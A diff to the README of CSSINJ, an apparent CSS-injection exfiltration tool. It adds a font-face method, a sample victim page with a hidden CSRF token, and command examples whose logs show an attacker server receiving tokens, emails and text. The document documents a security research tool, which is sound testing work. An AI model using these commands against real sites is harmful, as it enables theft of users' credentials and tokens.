@@ -36,7 +36,7 @@ Now you’re ready to use **CSSINJ**! 🎯
 ## Usage  
 
 ```bash
-python3 -m cssinj inject [-h] -H HOSTNAME -p PORT -i IDENTIFIER
+python3 -m cssinj [-h] -H HOSTNAME -p PORT [-e ELEMENT] [-a ATTRIBUT] [-d] [-m {recusive,font-face}]
 ```
 
 ### Options  
@@ -49,11 +49,13 @@ python3 -m cssinj inject [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 | `-e, --element`        | HTML element to extract specific data       |
 | `-a, --attribut`       | Specify an element Attribute Selector for exfiltration     |
 | `-d, --details`        | Show detailed logs of the exfiltration process, including extracted data |
+| `-m, --method`        | Specify the type of exfiltration (recusive or font-face) |
 
 ### Example  
 
 #### Victim's View :
 ```html
+<h1>Welcome on my page !</h1>
 <input type="text" id="username" value="admin" disabled>
 <input type="email" id="email" value="admin@admin.XX" disabled>
 <input type="text" class="csrf" value="MySecretAdminToken" hidden>
@@ -65,7 +67,8 @@ python3 -m cssinj inject [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 ...
 ```
 
-#### Using a specific CSS identifier : 
+#### Recursive attack
+###### Using a specific HTML identifier : 
 
 ```bash
 ~ python3 CSSINJ.py inject -H 127.0.0.1 -p 5005 -e input
@@ -76,18 +79,18 @@ python3 -m cssinj inject [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 | |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
  \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
 
-[2025-03-11 02:40:55] 🛠️ Attacker's server started on 127.0.0.1:5005
-[2025-03-11 02:40:56] 🌐 Connection from ::1
-[2025-03-11 02:40:56] ⚙️ ID : 1
-[2025-03-11 02:40:56] ✅ [1] - The value exfiltrated from input is : MySecretAdminToken
-[2025-03-11 02:40:56] ✅ [1] - The value exfiltrated from input is : admin@admin.XX
-[2025-03-11 02:40:56] ✅ [1] - The value exfiltrated from input is : admin
+[2025-03-11 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
+[2025-03-11 03:06:49] 🌐 Connection from ::1
+[2025-03-11 03:06:49] ⚙️ ID : 1
+[2025-03-11 03:06:49] ✅ [1] - The value exfiltrated from input is : MySecretAdminToken
+[2025-03-11 03:06:49] ✅ [1] - The value exfiltrated from input is : admin@admin.XX
+[2025-03-11 03:06:49] ✅ [1] - The value exfiltrated from input is : admin
 ```
 
-#### Using a specific CSS attribute selector and a generic CSS identifier:
+###### Using a specific CSS attribute selector and a generic HTML identifier:
 
 ```bash
-~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -e \* -a src
+~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -e * -a src
   _____   _____   _____  _____  _   _       _     _____  __     __
  / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
 | |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
@@ -99,6 +102,37 @@ python3 -m cssinj inject [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 [2025-03-11 03:06:49] 🌐 Connection from ::1
 [2025-03-11 03:06:49] ⚙️ ID : 1
 [2025-03-11 03:06:49] ✅ [1] - The src exfiltrated from * is : XXXXXXXXXXX.XX
+```
+
+#### Font-face attack
+```bash
+~ python3 -m cssinj -H 127.0.0.1 -p 5005 -e h1 --method font-face
+  _____   _____   _____  _____  _   _       _     _____  __     __
+ / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
+| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
+| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
+| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
+ \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
+
+[2025-05-21 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
+[2025-05-21 03:06:49] 🌐 Connection from 127.0.0.1
+[2025-05-21 03:06:49] ⚙️ ID : 1
+[2025-05-21 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
+[2025-05-21 03:06:49] 🌐 Connection from 127.0.0.1
+[2025-05-21 03:06:49] ⚙️ ID : 1
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 :  
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : e
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : W
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : l
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : c
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : o
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : m
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : n
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : y
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : p
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : a
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : g
+[2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : !
 ```
 
 ## Browser-Specific Behavior
@@ -134,4 +168,4 @@ This tool is intended **only for ethical hacking and security research**. **Unau
 
 ## Author  
 
-**CSSINJ** was developed by **Asako**.  
+**CSSINJ** was developed by **Asako**.
